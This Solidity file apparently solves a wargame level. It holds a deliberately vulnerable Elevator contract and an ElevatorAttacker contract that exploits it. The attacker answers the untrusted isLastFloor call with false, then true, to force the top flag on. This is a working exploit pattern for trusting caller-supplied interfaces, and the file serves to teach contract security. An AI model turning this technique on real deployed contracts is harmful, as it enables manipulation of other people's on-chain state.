// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract ElevatorAttacker{
    Elevator public elevator;
    constructor(Elevator _el) {
        elevator = _el;
    }
    function isLastFloor(uint) external view returns (bool){
        if (elevator.floor() == 0){
            return false;
        }
        return true;
    }

    function attack() external {
        elevator.goTo(5);
    }
}